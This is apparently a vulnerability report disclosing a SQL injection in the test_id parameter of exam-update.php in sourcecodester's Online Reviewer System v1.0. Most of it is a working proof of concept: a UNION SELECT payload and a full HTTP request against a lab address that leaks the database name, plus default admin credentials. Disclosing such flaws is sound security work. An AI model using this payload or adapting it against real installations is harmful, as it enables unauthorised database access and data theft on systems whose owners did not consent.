# Online Reviewer System v1.0 by sourcecodester has SQL injection 2

BUG_Author: Du Kai

Login account: admin/admin

vendors: https://www.sourcecodester.com/php/12937/online-reviewer-system-using-phppdo.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /reviewer/system/system/admins/assessments/examproper/exam-update.php

Vulnerability location: /reviewer/system/system/admins/assessments/examproper/exam-update.php?test_id=, test_id

dbname=fbc_reviewer

[+] Payload: /reviewer/system/system/admins/assessments/examproper/exam-update.php?test_id=-93%27%20union%20select%201,2,3,4,5,6,database(),8,9,10--+ // Leak place ---> test_id

```sql
GET /reviewer/system/system/admins/assessments/examproper/exam-update.php?test_id=-93%27%20union%20select%201,2,3,4,5,6,database(),8,9,10--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=uu9o3gvufrsptq8n5f6gjpbuac
Connection: close

```

<img width="1904" height="753" alt="image" src="https://github.com/user-attachments/assets/f3dd1515-45c9-47f2-9b25-f05118b316d9" />
